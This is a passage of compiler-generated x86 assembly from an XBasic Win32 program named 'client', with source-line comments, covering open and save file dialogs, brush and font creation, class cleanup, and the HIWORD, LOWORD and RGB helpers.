	mov	eax,d[eax-8]			;;; i595
A.408:
	mov	ebx,254			;;; i659
	xchg	eax,ebx			;;; i790
	sub	eax,ebx			;;; i791
	mov	d[esp],eax			;;; i887
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,[ebp+12]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2319] END IF
end.if.00F7.client:
;
; [2320] ofn.lpstrFile 			= &fileName$
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+28],eax			;;; i13b
;
; [2321] ofn.nMaxFile 				= 255'set the maximum length of a returned file
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,255			;;; i659
	mov	d[eax+32],ebx			;;; i13b
;
; [2322] buffer2$ = SPACE$(254)
#ifdef ShowOpenFileDialog.buffer2$
#undef ShowOpenFileDialog.buffer2$
#endif
#define ShowOpenFileDialog.buffer2$ ebp-48	; exposes local variable 'buffer2$'
;
	sub	esp,64			;;; i487
	mov	d[esp],254
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2323] ofn.lpstrFileTitle 	= &buffer2$'Create a buffer for the file title
	mov	eax,d[ebp-48]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+36],eax			;;; i13b
;
; [2324] ofn.nMaxFileTitle 	= 255'Set the maximum length of a returned file title
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,255			;;; i659
	mov	d[eax+40],ebx			;;; i13b
;
; [2325] ofn.lpstrInitialDir = &initDir$'Set the initial directory
	mov	eax,d[ebp+20]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+44],eax			;;; i13b
;
; [2326] ofn.lpstrTitle 			= &title$'Set the title
	mov	eax,d[ebp+24]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+48],eax			;;; i13b
;
; [2327] ofn.flags = $$OFN_FILEMUSTEXIST | $$OFN_PATHMUSTEXIST | $$OFN_EXPLORER
	mov	eax,4096			;;; i659
	or	eax,2048			;;; i763
	or	eax,524288			;;; i763
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+52],eax			;;; i13b
;
; [2329] 'call dialog
;
; [2330] IFZ GetOpenFileNameA (&ofn) THEN
;
; [0] EXTERNAL FUNCTION GetOpenFileNameA (pOpenfilename)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_GetOpenFileNameA@4			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00F8.client			;;; i195
;
; [2331] fileName$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2332] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func20.client			;;; i258
;
; [2333] ELSE
	jmp	end.if.00F8.client			;;; i107
else.00F8.client:
;
; [2334] fileName$ = CSTRING$(ofn.lpstrFile)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+28]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2335] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func20.client			;;; i258
;
; [2336] END IF
end.if.00F8.client:
;
; [2337] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ShowOpenFileDialog.client:  ;;; Function end label for Assembly Programmers.
end.func20.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func20.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
free.func20.client:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ShowOpenFileDialog ()  *****
;  *****
;
; [2339] FUNCTION  ShowSaveFileDialog (hWndOwner, @fileName$, filter$, initDir$, title$)
.code
;
#ifdef ShowSaveFileDialog.hWndOwner
#undef ShowSaveFileDialog.hWndOwner
#endif
#define ShowSaveFileDialog.hWndOwner ebp+8	; exposes function argument 'hWndOwner'
;
;
#ifdef ShowSaveFileDialog.fileName$
#undef ShowSaveFileDialog.fileName$
#endif
#define ShowSaveFileDialog.fileName$ ebp+12	; exposes function argument 'fileName$'
;
;
#ifdef ShowSaveFileDialog.filter$
#undef ShowSaveFileDialog.filter$
#endif
#define ShowSaveFileDialog.filter$ ebp+16	; exposes function argument 'filter$'
;
;
#ifdef ShowSaveFileDialog.initDir$
#undef ShowSaveFileDialog.initDir$
#endif
#define ShowSaveFileDialog.initDir$ ebp+20	; exposes function argument 'initDir$'
;
;
#ifdef ShowSaveFileDialog.title$
#undef ShowSaveFileDialog.title$
#endif
#define ShowSaveFileDialog.title$ ebp+24	; exposes function argument 'title$'
;
align 16
_ShowSaveFileDialog.client@20:
;  *****
;  *****  FUNCTION  ShowSaveFileDialog ()  *****
;  *****
func21.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func21.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.417:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.417			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody21.client:
;
; [2340] OPENFILENAME ofn
; .composites = ebp-40	; internal variable
#ifdef ShowSaveFileDialog.ofn
#undef ShowSaveFileDialog.ofn
#endif
#define ShowSaveFileDialog.ofn ebp-44	; exposes local variable 'ofn'
;
;
; [2341] SHARED hInst
;
; [2343] ofn.lStructSize = SIZE(ofn)'set length of struct
	mov	eax,76			;;; i584
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [2344] ofn.hwndOwner 	= hWndOwner'set parent window handle
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [2345] ofn.hInstance 	= hInst'set the application's instance
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[%hInst.client]			;;; i663a
	mov	d[eax+8],ebx			;;; i13b
;
; [2346] ofn.lpstrFilter = &filter$
	mov	eax,d[ebp+16]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [2348] 'create a buffer for the returned file
;
; [2349] IF fileName$ = "" THEN
	mov	eax,[ebp+12]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	jne	>> else.00F9.client			;;; i219
;
; [2350] fileName$ = SPACE$(254)
	sub	esp,64			;;; i487
	mov	d[esp],254
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2351] ELSE
	jmp	end.if.00F9.client			;;; i107
else.00F9.client:
;
; [2352] fileName$ = fileName$ + SPACE$(254 - LEN(fileName$))
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.413			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.413:
	mov	ebx,254			;;; i659
	xchg	eax,ebx			;;; i790
	sub	eax,ebx			;;; i791
	mov	d[esp],eax			;;; i887
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,[ebp+12]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2353] END IF
end.if.00F9.client:
;
; [2354] ofn.lpstrFile 			= &fileName$
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+28],eax			;;; i13b
;
; [2356] ofn.nMaxFile 				= 255'set the maximum length of a returned file
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,255			;;; i659
	mov	d[eax+32],ebx			;;; i13b
;
; [2357] buffer2$ = SPACE$(254)
#ifdef ShowSaveFileDialog.buffer2$
#undef ShowSaveFileDialog.buffer2$
#endif
#define ShowSaveFileDialog.buffer2$ ebp-48	; exposes local variable 'buffer2$'
;
	sub	esp,64			;;; i487
	mov	d[esp],254
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2358] ofn.lpstrFileTitle 	= &buffer2$'Create a buffer for the file title
	mov	eax,d[ebp-48]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+36],eax			;;; i13b
;
; [2359] ofn.nMaxFileTitle 	= 255'Set the maximum length of a returned file title
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,255			;;; i659
	mov	d[eax+40],ebx			;;; i13b
;
; [2360] ofn.lpstrInitialDir = &initDir$'Set the initial directory
	mov	eax,d[ebp+20]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+44],eax			;;; i13b
;
; [2361] ofn.lpstrTitle 			= &title$'Set the title
	mov	eax,d[ebp+24]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+48],eax			;;; i13b
;
; [2362] ofn.flags = $$OFN_PATHMUSTEXIST | $$OFN_EXPLORER'flags
	mov	eax,2048			;;; i659
	or	eax,524288			;;; i763
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+52],eax			;;; i13b
;
; [2364] 'call dialog
;
; [2365] IFZ GetSaveFileNameA (&ofn) THEN
;
; [0] EXTERNAL FUNCTION GetSaveFileNameA (pOpenfilename)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_GetSaveFileNameA@4			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00FA.client			;;; i195
;
; [2366] fileName$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2367] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func21.client			;;; i258
;
; [2368] ELSE
	jmp	end.if.00FA.client			;;; i107
else.00FA.client:
;
; [2369] fileName$ = CSTRING$(ofn.lpstrFile)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+28]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2370] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func21.client			;;; i258
;
; [2371] END IF
end.if.00FA.client:
;
; [2372] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ShowSaveFileDialog.client:  ;;; Function end label for Assembly Programmers.
end.func21.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func21.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
free.func21.client:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ShowSaveFileDialog ()  *****
;  *****
;
; [2374] FUNCTION  SetColor (txtColor, bkColor, wParam, lParam)
.code
;
#ifdef SetColor.txtColor
#undef SetColor.txtColor
#endif
#define SetColor.txtColor ebp+8	; exposes function argument 'txtColor'
;
;
#ifdef SetColor.bkColor
#undef SetColor.bkColor
#endif
#define SetColor.bkColor ebp+12	; exposes function argument 'bkColor'
;
;
#ifdef SetColor.wParam
#undef SetColor.wParam
#endif
#define SetColor.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef SetColor.lParam
#undef SetColor.lParam
#endif
#define SetColor.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_SetColor.client@16:
;  *****
;  *****  FUNCTION  SetColor ()  *****
;  *****
func15.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody15.client:
;
; [2375] SHARED hNewBrush
data section 'globals$shared'
align	4
%hNewBrush.client:	db 4 dup ?
.code
;
; [2378] DeleteObject (hNewBrush)
	push	[%hNewBrush.client]			;;; i672a
	call	_DeleteObject@4			;;; i619
;
; [2379] hNewBrush = CreateSolidBrush(bkColor)
;
; [0] EXTERNAL FUNCTION  CreateSolidBrush           (color)
	push	[ebp+12]			;;; i674a
	call	_CreateSolidBrush@4			;;; i619
	mov	d[%hNewBrush.client],eax			;;; i668
;
; [2380] SetTextColor (wParam, txtColor)
;
; [0] EXTERNAL FUNCTION  SetTextColor               (hdc, pixel)
	push	[ebp+8]			;;; i674a
	push	[ebp+16]			;;; i674a
	call	_SetTextColor@8			;;; i619
;
; [2381] SetBkColor (wParam, bkColor)
;
; [0] EXTERNAL FUNCTION  SetBkColor                 (hdc, color)
	push	[ebp+12]			;;; i674a
	push	[ebp+16]			;;; i674a
	call	_SetBkColor@8			;;; i619
;
; [2383] RETURN hNewBrush
	mov	eax,d[%hNewBrush.client]			;;; i663a
	jmp	end.func15.client			;;; i258
;
; [2384] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SetColor.client:  ;;; Function end label for Assembly Programmers.
end.func15.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SetColor ()  *****
;  *****
;
; [2386] FUNCTION  NewFont (fontName$, pointSize, weight, italic, underline)
.code
;
#ifdef NewFont.fontName$
#undef NewFont.fontName$
#endif
#define NewFont.fontName$ ebp+8	; exposes function argument 'fontName$'
;
;
#ifdef NewFont.pointSize
#undef NewFont.pointSize
#endif
#define NewFont.pointSize ebp+12	; exposes function argument 'pointSize'
;
;
#ifdef NewFont.weight
#undef NewFont.weight
#endif
#define NewFont.weight ebp+16	; exposes function argument 'weight'
;
;
#ifdef NewFont.italic
#undef NewFont.italic
#endif
#define NewFont.italic ebp+20	; exposes function argument 'italic'
;
;
#ifdef NewFont.underline
#undef NewFont.underline
#endif
#define NewFont.underline ebp+24	; exposes function argument 'underline'
;
align 16
_NewFont.client@20:
;  *****
;  *****  FUNCTION  NewFont ()  *****
;  *****
func16.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.422:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.422			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.423:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.423			;;; .....
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody16.client:
;
; [2388] LOGFONT lf
; .composites = ebp-40	; internal variable
#ifdef NewFont.lf
#undef NewFont.lf
#endif
#define NewFont.lf ebp-44	; exposes local variable 'lf'
;
;
; [2389] hDC 					= GetDC ($$HWND_DESKTOP)
#ifdef NewFont.hDC
#undef NewFont.hDC
#endif
#define NewFont.hDC ebp-48	; exposes local variable 'hDC'
;
;
; [0] EXTERNAL FUNCTION GetDC (hwnd)
	push	0			;;; i656a
	call	_GetDC@4			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [2390] hFont 				= GetStockObject ($$DEFAULT_GUI_FONT)' get a font handle
#ifdef NewFont.hFont
#undef NewFont.hFont
#endif
#define NewFont.hFont ebp-52	; exposes local variable 'hFont'
;
	push	17			;;; i656a
	call	_GetStockObject@4			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [2391] bytes 				= GetObjectA (hFont, SIZE(lf), &lf)' fill LOGFONT struct lf
#ifdef NewFont.bytes
#undef NewFont.bytes
#endif
#define NewFont.bytes ebp-56	; exposes local variable 'bytes'
;
;
; [0] EXTERNAL FUNCTION  GetObjectA                 (hObject, nCount, ObjectAddr)
	mov	eax,64			;;; i584
; .xstk16.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	_GetObjectA@12			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2392] lf.faceName 	= fontName$' set font name
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,[ebp+8]			;;; i665
	lea	edi,[eax+28]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,32			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [2393] lf.italic 		= italic' set italic
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+20]			;;; i665
	mov	b[eax+20],bl			;;; i13b
;
; [2394] lf.weight 		= weight' set weight
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+16]			;;; i665
	mov	d[eax+16],ebx			;;; i13b
;
; [2395] lf.underline 	= underline' set underlined
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+24]			;;; i665
	mov	b[eax+21],bl			;;; i13b
;
; [2396] lf.height 		= -1 * pointSize * GetDeviceCaps(hDC, $$LOGPIXELSY) / 72.0
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp+12]			;;; i665
	imul	eax,ebx			;;; i805
;
; [0] EXTERNAL FUNCTION  GetDeviceCaps              (hdc, index)
	mov	d[ebp-64],eax			;;; i670
	push	90			;;; i656a
	push	[ebp-48]			;;; i674a
	call	_GetDeviceCaps@8			;;; i619
	mov	ebx,d[ebp-64]			;;; i665
	imul	eax,ebx			;;; i805
	mov	d[ebp-8],eax			;;; i389
	fild	d[ebp-8]			;;; i390
	push	1116733440			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	fdiv				;;; i841
	mov	ebx,d[ebp-44]			;;; i665
	fistp	d[ebp-8]			;;; i385
	mov	eax,d[ebp-8]			;;; i386
	mov	d[ebx],eax			;;; i13b
;
; [2397] ReleaseDC ($$HWND_DESKTOP, hDC)
;
; [0] EXTERNAL FUNCTION ReleaseDC (hwnd, hdc)
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	call	_ReleaseDC@8			;;; i619
;
; [2398] RETURN CreateFontIndirectA (&lf)' create a new font && get handle
;
; [0] EXTERNAL FUNCTION  CreateFontIndirectA        (addrLOGFONT)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_CreateFontIndirectA@4			;;; i619
	jmp	end.func16.client			;;; i258
;
; [2400] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.NewFont.client:  ;;; Function end label for Assembly Programmers.
end.func16.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  NewFont ()  *****
;  *****
;
; [2402] FUNCTION  SetNewFont (hwndCtl, hFont)
.code
;
#ifdef SetNewFont.hwndCtl
#undef SetNewFont.hwndCtl
#endif
#define SetNewFont.hwndCtl ebp+8	; exposes function argument 'hwndCtl'
;
;
#ifdef SetNewFont.hFont
#undef SetNewFont.hFont
#endif
#define SetNewFont.hFont ebp+12	; exposes function argument 'hFont'
;
align 16
_SetNewFont.client@8:
;  *****
;  *****  FUNCTION  SetNewFont ()  *****
;  *****
func17.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody17.client:
;
; [2404] RETURN SendMessageA (hwndCtl, $$WM_SETFONT, hFont, $$TRUE)
	push	-1			;;; i656a
	push	[ebp+12]			;;; i674a
	push	48			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
	jmp	end.func17.client			;;; i258
;
; [2405] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SetNewFont.client:  ;;; Function end label for Assembly Programmers.
end.func17.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SetNewFont ()  *****
;  *****
;
; [2408] FUNCTION  CleanUp ()
.code
align 16
_CleanUp.client@0:
;  *****
;  *****  FUNCTION  CleanUp ()  *****
;  *****
func18.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody18.client:
;
; [2409] SHARED hInst, className$
;
; [2411] UnregisterClassA(&className$, hInst)
;
; [0] EXTERNAL FUNCTION UnregisterClassA (lpClassName, hInstance)
	mov	eax,d[%className$.client]			;;; i642
; .xstk18.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	push	[%hInst.client]			;;; i672a
	push	[ebp-44]			;;; i674a
	call	_UnregisterClassA@8			;;; i619
;
; [2412] WSACleanup ()
	call	_WSACleanup@0			;;; i619
;
; [2413] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CleanUp.client:  ;;; Function end label for Assembly Programmers.
end.func18.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  CleanUp ()  *****
;  *****
;
; [2415] FUNCTION  HIWORD (x)
.code
;
#ifdef HIWORD.x
#undef HIWORD.x
#endif
#define HIWORD.x ebp+8	; exposes function argument 'x'
;
align 16
_HIWORD.client@4:
;  *****
;  *****  FUNCTION  HIWORD ()  *****
;  *****
func1D.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody1D.client:
;
; [2417] RETURN x{{16,16}}
	mov	eax,16			;;; i659
	mov	ebx,16			;;; i659
	mov	esi,d[ebp+8]			;;; i665
	mov	ecx,eax			;;; i479
	mov	edi,ebx
	add	ecx,edi
	neg	ecx
	add	ecx,32
	shl	esi,cl
	add	ecx,edi
	sar	esi,cl
	mov	eax,esi			;;; i486
	jmp	end.func1D.client			;;; i258
;
; [2418] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.HIWORD.client:  ;;; Function end label for Assembly Programmers.
end.func1D.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  HIWORD ()  *****
;  *****
;
; [2420] FUNCTION  LOWORD (x)
.code
;
#ifdef LOWORD.x
#undef LOWORD.x
#endif
#define LOWORD.x ebp+8	; exposes function argument 'x'
;
align 16
_LOWORD.client@4:
;  *****
;  *****  FUNCTION  LOWORD ()  *****
;  *****
func1E.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody1E.client:
;
; [2422] RETURN x{{16,0}}
	mov	eax,16			;;; i659
	mov	ebx,0			;;; i659
	mov	esi,d[ebp+8]			;;; i665
	mov	ecx,eax			;;; i479
	mov	edi,ebx
	add	ecx,edi
	neg	ecx
	add	ecx,32
	shl	esi,cl
	add	ecx,edi
	sar	esi,cl
	mov	eax,esi			;;; i486
	jmp	end.func1E.client			;;; i258
;
; [2423] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.LOWORD.client:  ;;; Function end label for Assembly Programmers.
end.func1E.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  LOWORD ()  *****
;  *****
;
; [2425] FUNCTION  RGB (r, g, b)
.code
;
#ifdef RGB.r
#undef RGB.r
#endif
#define RGB.r ebp+8	; exposes function argument 'r'
;
;
#ifdef RGB.g
#undef RGB.g
#endif
#define RGB.g ebp+12	; exposes function argument 'g'
;
;
#ifdef RGB.b
#undef RGB.b
#endif
#define RGB.b ebp+16	; exposes function argument 'b'
;
align 16
_RGB.client@12:
;  *****
;  *****  FUNCTION  RGB ()  *****
;  *****
func1F.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody1F.client:
;
; [2427] IF r > 255 THEN r = 255
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,255			;;; i684a
	jle	>> else.00FB.client			;;; i219
	mov	eax,255			;;; i659
	mov	d[ebp+8],eax			;;; i670
else.00FB.client:
end.if.00FB.client:
;
; [2428] IF g > 255 THEN g = 255
	mov	eax,d[ebp+12]			;;; i665
	cmp	eax,255			;;; i684a
	jle	>> else.00FC.client			;;; i219
	mov	eax,255			;;; i659
	mov	d[ebp+12],eax			;;; i670
else.00FC.client:
end.if.00FC.client:
;
; [2429] IF b > 255 THEN b = 255
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,255			;;; i684a
	jle	>> else.00FD.client			;;; i219
	mov	eax,255			;;; i659
	mov	d[ebp+16],eax			;;; i670
